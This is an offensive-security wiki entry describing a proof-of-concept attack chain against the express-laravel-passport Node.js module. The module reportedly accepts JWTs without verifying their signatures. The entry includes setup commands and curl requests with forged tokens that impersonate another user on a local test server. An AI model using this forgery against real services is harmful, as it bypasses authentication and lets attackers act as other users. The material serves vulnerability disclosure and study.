---
tags:
  - jwt
  - authentication-bypass
  - node.js
  - express
  - impersonation
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/curl]]'
  - '[[tools/jwt.io]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Vulnerable-Express-App-with-express-laravel-passport]]'
  - '[[procedures/Test-JWT-Authentication-with-Crafted-Token]]'
  - '[[procedures/Forge-JWT-Token-for-User-Impersonation]]'
step_count: 3
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:31:19.047Z'
description: >-
  Demonstrates improper authentication vulnerability in express-laravel-passport
  allowing JWT payload modification without signature verification, enabling
  user impersonation.
skill_level: intermediate
impact_level: high
id: cf6f043a-51c0-4343-a216-65d171bfa0ed
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# JWT Token Forgery for User Impersonation in express-laravel-passport

Multi-stage attack chain demonstrating exploitation of improper JWT validation in the express-laravel-passport Node.js module, allowing attackers to forge tokens and impersonate users.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Vulnerable App] --> B[Test Base Token] --> C[Forge and Impersonate]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/curl]]
- [[tools/jwt.io]]

### Target Environment

- Node.js runtime
- Port 3000 available
- No specific network access beyond local testing

### Initial Access Requirements

- Local development environment
- No credentials needed for PoC setup
- Source code access to vulnerable module

## Detailed Attack Procedures

### Step 1: Setup Vulnerable Application

procedure: [[procedures/Setup-Vulnerable-Express-App-with-express-laravel-passport]]

**Objective**: Create and run a proof-of-concept Express app using the vulnerable express-laravel-passport module to simulate the authentication flaw.

**Instructions**: Follow the procedure to initialize the project, install dependencies, create the app code, and start the server. Use [[commands/mkdir-poc-directory]] to create the test directory, then [[commands/npm-init-project]] and install packages with [[commands/npm-install-express]], [[commands/npm-install-sequelize]], [[commands/npm-install-sqlite3]], and [[commands/npm-install-express-laravel-passport]]. Create index.js as per the procedure, then run with [[commands/node-run-app]].

```bash
mkdir poc && cd poc/ && npm init -y && npm i express && npm i sequelize@4.32.7 && npm i sqlite3 && npm i express-laravel-passport
```

**Expected Output**: Server starts on port 3000 with log "Example app listening on port 3000!".

**Success Indicators**:
- Directory and dependencies installed successfully
- Server runs without errors
- SQLite in-memory DB synced with test data

### Step 2: Test Base JWT Token

procedure: [[procedures/Test-JWT-Authentication-with-Crafted-Token]]

**Objective**: Verify the application accepts a crafted JWT token with an invalid signature, extracting the payload's jti field.

**Instructions**: Use [[tools/jwt.io]] to craft a basic JWT with payload {"jti": 1} and an arbitrary signature. Send a request using [[commands/curl-send-jwt-token-jti1]] to the endpoint.

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjF9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

**Expected Output**: Response "logged in as: 1".

**Success Indicators**:
- Token accepted despite invalid signature
- User ID from payload logged correctly

### Step 3: Forge Token for Impersonation

procedure: [[procedures/Forge-JWT-Token-for-User-Impersonation]]

**Objective**: Modify the JWT payload to change the jti field (e.g., to 2) while reusing the invalid signature, demonstrating impersonation.

**Instructions**: Using the base token from Step 2, alter the payload on [[tools/jwt.io]] to {"jti": 2} without changing the signature. Send the modified token with [[commands/curl-send-forged-jwt-token-jti2]].

```bash
curl -H "authorization:Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOjJ9.n4tWlxEua5n2OtGTUIxIofRS1Rh3tXRsx6B8jIXPsdc" localhost:3000
```

**Expected Output**: Response "logged in as: 2".

**Success Indicators**:
- Modified token accepted
- Impersonation successful, bypassing signature verification

## Attack Chain Summary

### Key Achievements

1. Setup of vulnerable Node.js app simulating Laravel Passport auth
2. Confirmation of JWT decode without verification
3. Successful user impersonation via payload forgery

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access

---

*Last updated: 2023-10-01T00:00:00Z*
